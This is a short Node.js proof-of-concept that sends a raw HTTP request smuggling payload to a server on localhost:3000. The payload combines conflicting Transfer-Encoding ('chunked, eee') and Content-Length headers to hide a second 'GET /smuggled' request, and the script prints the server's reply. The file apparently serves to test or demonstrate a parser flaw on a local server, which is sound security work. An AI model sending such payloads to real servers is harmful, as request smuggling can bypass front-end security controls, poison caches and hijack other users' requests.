const net = require('net')

const smuggledHttpRequest = `
GET / HTTP/1.1
Content-Type: text/plain; charset=utf-8
Host: localhost
Connection: keep-alive
Transfer-Encoding: chunked, eee
Content-Length: 1

XGET /smuggled HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

name='joao'
`;

const clientSmuggled = net.connect(
  3000,
  () => {
    const a = smuggledHttpRequest.replace(/\n/g, '\r\n')
    clientSmuggled.end(a);
  });

// clientSmuggled.on("connect", () => console.log("connected"))
clientSmuggled.on("data", data => console.log(`\n==== (HTTP SMUGGLED) ==== \n${data}`))
